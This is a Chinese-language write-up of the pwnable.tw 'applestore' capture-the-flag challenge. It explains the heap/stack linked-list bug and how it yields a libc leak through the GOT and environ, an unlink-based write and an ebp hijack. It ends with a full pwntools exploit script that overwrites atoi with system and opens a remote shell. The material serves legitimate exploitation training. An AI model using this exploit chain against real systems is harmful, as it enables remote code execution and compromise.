---

title: pwnable.tw writeup - applestore
lang: zh
layout: article
show_subscribe: false
tags: [ctf,pwn]

---

主要参考了这篇文章: [pwnable.tw - applestore](https://blog.srikavin.me/posts/pwnable-tw-applestore/) 。

main 函数设置了信号，到时之后程序自动退出，可以把 `call    _alarm` patch 掉。

## 关键函数

程序没有去符号，分析起来还是比较容易的。

### handler 函数:

```cpp
unsigned int handler()
{
  char nptr[22]; // [esp+16h] [ebp-22h] BYREF
  unsigned int v2; // [esp+2Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  while ( 1 )
  {
    printf("> ");
    fflush(stdout);
    my_read(nptr, 0x15u);
    switch ( atoi(nptr) )
    {
      case 1:
        list();
        break;
      case 2:
        add();
        break;
      case 3:
        delete();
        break;
      case 4:
        cart();
        break;
      case 5:
        checkout();
        break;
      case 6:
        puts("Thank You for Your Purchase!");
        return __readgsdword(0x14u) ^ v2;
      default:
        puts("It's not a choice! Idiot.");
        break;
    }
  }
}
```

根据用户输入调用相应的功能。


### cart 函数：

打印购物车。

```cpp
int cart()
{
  int idx; // eax
  int num; // [esp+18h] [ebp-30h]
  int total; // [esp+1Ch] [ebp-2Ch]
  devicebought *i; // [esp+20h] [ebp-28h]
  char buf[22]; // [esp+26h] [ebp-22h] BYREF
  unsigned int v6; // [esp+3Ch] [ebp-Ch]

  v6 = __readgsdword(0x14u);
  num = 1;
  total = 0;
  printf("Let me check your cart. ok? (y/n) > ");
  fflush(stdout);
  my_read(buf, 0x15u);
  if ( buf[0] == 'y' )
  {
    puts("==== Cart ====");
    for ( i = (devicebought *)firstdevice; i; i = (devicebought *)i->next )
    {
      idx = num++;
      printf("%d: %s - $%d\n", idx, i->devicename, i->deviceprice);
      total += i->deviceprice;
    }
  }
  return total;
}
```

其中 devicebought 结构：

```cpp
struct devicebought{
    char *devicename;
    int deviceprice;
    unsigned int next;
    unsigned int pre;
};
```

双向链表结构维护购物车。

### checkout 函数：

```cpp
unsigned int checkout()
{
  int total; // [esp+10h] [ebp-28h]
  devicebought iphone8; // [esp+18h] [ebp-20h] BYREF
  unsigned int v3; // [esp+2Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  total = cart();
  if ( total == 7174 )
  {
    puts("*: iPhone 8 - $1");
    asprintf(&iphone8.devicename, "%s", "iPhone 8");
    iphone8.deviceprice = 1;
    insert(&iphone8);
    total = 7175;
  }
  printf("Total: $%d\n", total);
  puts("Want to checkout? Maybe next time!");
  return __readgsdword(0x14u) ^ v3;
}
```

先打印购物车，然后如果钱到达 7174 ，购物车里再加一台 `iPhone 8` 。 但是 iPhone 8 是分配在栈上的,为后面的利用创造了条件。


用下面这个网站解丢番图方程 `a199+b399=7174` ,得到需要加入购物车的 a,b 。

* [Integer Diophantine equations solver](https://www.hackmath.net/en/calculator/integer-diophantine-equations-solver)


### delete 函数：

```cpp
unsigned int delete()
{
  int num; // [esp+10h] [ebp-38h]
  devicebought *thisdevice; // [esp+14h] [ebp-34h]
  int itemnumber; // [esp+18h] [ebp-30h]
  devicebought *next; // [esp+1Ch] [ebp-2Ch]
  devicebought *pre; // [esp+20h] [ebp-28h]
  char nptr[22]; // [esp+26h] [ebp-22h] BYREF
  unsigned int v7; // [esp+3Ch] [ebp-Ch]

  v7 = __readgsdword(0x14u);
  num = 1;
  thisdevice = (devicebought *)firstdevice;
  printf("Item Number> ");
  fflush(stdout);
  my_read(nptr, 21u);
  itemnumber = atoi(nptr);
  while ( thisdevice )
  {
    if ( num == itemnumber )
    {
      next = (devicebought *)thisdevice->next;
      pre = (devicebought *)thisdevice->pre;
      if ( pre )
        pre->next = (unsigned int)next;
      if ( next )
        next->pre = (unsigned int)pre;
      printf("Remove %d:%s from your shopping cart.\n", num, thisdevice->devicename);
      return __readgsdword(0x14u) ^ v7;
    }
    ++num;
    thisdevice = (devicebought *)thisdevice->next;
  }
  return __readgsdword(0x14u) ^ v7;
}
```

将节点从链表中取出来。

## Exploitation

### 写 iphone8 节点内容

可以参考这篇文章上的图 [pwnable.tw - applestore](https://blog.srikavin.me/posts/pwnable-tw-applestore/#overwriting-the-item) 。

handler 函数调用 checkout 函数, iPhone8 所在的位置为 `ebp-0x20`。 handler 函数调用 cart 函数 buf 的位置为 `ebp-0x22` 。

```cpp
int cart()
{
  int idx; // eax
  int num; // [esp+18h] [ebp-30h]
  int total; // [esp+1Ch] [ebp-2Ch]
  devicebought *i; // [esp+20h] [ebp-28h]
  char buf[22]; // [esp+26h] [ebp-22h] BYREF
  unsigned int v6; // [esp+3Ch] [ebp-Ch]

  v6 = __readgsdword(0x14u);
  num = 1;
  total = 0;
  printf("Let me check your cart. ok? (y/n) > ");
  fflush(stdout);
  my_read(buf, 0x15u);
  ....
  
```

也就是说, cart 函数中在 buf 中输入两个字符后，就可以直接修改链表中 iphone8 节点的内容。 delete 函数中的 buf 也是一样的。

### 任意地址读

我们已经可以任意写 iphone8 节点中的内容了。 在 iphone8 结构中的 devicename 项中写地址，就可以用 cart 函数打印出来地址内容。

```cpp
int cart()
{

......

  if ( buf[0] == 'y' )
  {
    puts("==== Cart ====");
    for ( i = (devicebought *)firstdevice; i; i = (devicebought *)i->next )
    {
      idx = num++;
      printf("%d: %s - $%d\n", idx, i->devicename, i->deviceprice);
      total += i->deviceprice;
    }
  }
  return total;
}
```

可以泄露 GOT 表中函数的地址，拿到 libc 的基地址。 

libc 中有 envirion** 符号，指向envirion* 环境变量字符数组。

```bash
$ readelf -s   ./libc_32.so.6  | grep environ
   305: 001b1dbc     4 OBJECT  WEAK   DEFAULT   33 _environ@@GLIBC_2.0
  1039: 001b1dbc     4 OBJECT  WEAK   DEFAULT   33 environ@@GLIBC_2.0
  1398: 001b1dbc     4 OBJECT  GLOBAL DEFAULT   33 __environ@@GLIBC_2.0
```

可以让 cart 打印 `envirion**` 的内容，得到在栈上环境变量的地址。


###  有条件的地址写

我们可以利用 delete 函数 中的节点删除。 iphone8 节点中的内容可控。

```cpp
    if ( num == itemnumber )
    {
      next = (devicebought *)thisdevice->next;
      pre = (devicebought *)thisdevice->pre;
      if ( pre )
        pre->next = (unsigned int)next;
      if ( next )
        next->pre = (unsigned int)pre;
      printf("Remove %d:%s from your shopping cart.\n", num, thisdevice->devicename);
      return __readgsdword(0x14u) ^ v7;
    }
```

但是地址写有个条件， 需要 `next->pre` (即`next+0xc`) 和 `pre->next` (即`pre+0x8`) 这两个地址需要同时可写。

如果我们直接把 GOT 表中的 atoi 项改成 system 函数的地址, 因为 `system 函数地址->pre` 是不可写的段,这样程序会崩。所以不能这么直接改 GOT 表,得换种方式写。

### 劫持 handler 的 ebp

因为我们拿到环境变量所在的栈地址了,减去偏移可以知道 delete 的 ebp 所指向的位置。旧 ebp 的内容(即 handler 的 ebp )是可写的。

如果我们把 handler ebp 改在 GOT 中 atoi 函数地址附近,使得输入的 buf 指向 GOT 表中 atoi 函数所在的项。因为在  handler 函数中 `my_read(nptr, 0x15u);` 是通过 ebp 偏移寻址的。

```
.text:08048BFD 03C mov     dword ptr [esp+4], 15h ; nbytes
.text:08048C05 03C lea     eax, [ebp-22h]
.text:08048C08 03C mov     [esp], eax            ; buf
.text:08048C0B 03C call    my_read
.text:08048C0B
.text:08048C10 03C lea     eax, [ebp-22h]
.text:08048C13 03C mov     [esp], eax            ; nptr
.text:08048C16 03C call    _atoi
```

两个地址附近都可写。

所以我们让 ebp-22h（即输入缓冲区）指向 GOT 表中 atoi 函数，将 GOT 表中 atoi 函数的项直接输入覆盖为 `system` 函数地址与参数，就达到我们的目的了。

## Full script

```python
#!/usr/bin/env python3


from struct import pack
from pwn import *

HOST='chall.pwnable.tw'
PORT=10104
PROC="./applestore"

# context.log_level = 'DEBUG'

io=None
elf=ELF("./applestore")
lib = ELF("./libc_32.so.6")

if len(sys.argv) == 1 : 
    io=process("./applestore")
else:
    log.info("remote start")
    # 设置代理
    context.proxy=(socks.SOCKS5,'localhost',7890)
    io=remote(HOST,PORT)

def PauseLocalDebug():
    info("process pid: "+str(io.pid))
    pause()

def list():
    io.sendafter("> ","1")

def add(number):
    io.sendafter("> ","2")
    io.sendafter("> ",number)

def delete(number):
    io.sendafter("> ","3")
    io.sendafter("> ",number)

def cart(confirmation):
    io.sendafter("> ","4")
    io.sendafter("> ",confirmation)

def checkout(confirmation):
    io.sendafter("> ","5")
    io.sendafter("> ",confirmation)

def getIphone8():
    # $199
    a=16
    # $399
    b=10
    for i in range(a):
        add("1")
    for i in range(b):
        add("4")
    checkout('y\n')

getIphone8()

def create_device(name,price=0,fd=0,bk=0):
    return pack(name)+pack(price)+pack(fd)+pack(bk)

cart(b'yy'+create_device(elf.got['atoi']))
io.recvuntil("27: ")

atoiaddress=unpack(io.recvn(4))
lib.address=atoiaddress-lib.symbols['atoi']

info("atoi address: "+ hex(atoiaddress))
info("lib base address: "+ hex(lib.address))
info("environ ** address: "+hex(lib.symbols['environ']))

cart(b'yy'+create_device(lib.symbols['environ']))
io.recvuntil("27: ")

environstack=unpack(io.recvn(4))
info("environ stack address: "+hex(environstack))

# PauseLocalDebug()
# 得到 DeleteEbp 的位置。
DeleteEbp=environstack-260

# 劫持 delete 旧 ebp 到 GOT 表，使得 delete 函数 leave 后 handle 中的输入( handle中输入偏移 ebp-0x22 )恰好指向 GOT 表中 atoi 表项
delete(b'27'+create_device(0,0,elf.got['atoi']+0x22,DeleteEbp-0x8))

# input  中覆盖 GOT 中 atoi 函数表项
io.sendafter("> ",pack(lib.symbols['system'])+b";/bin/sh;")

io.interactive()
```

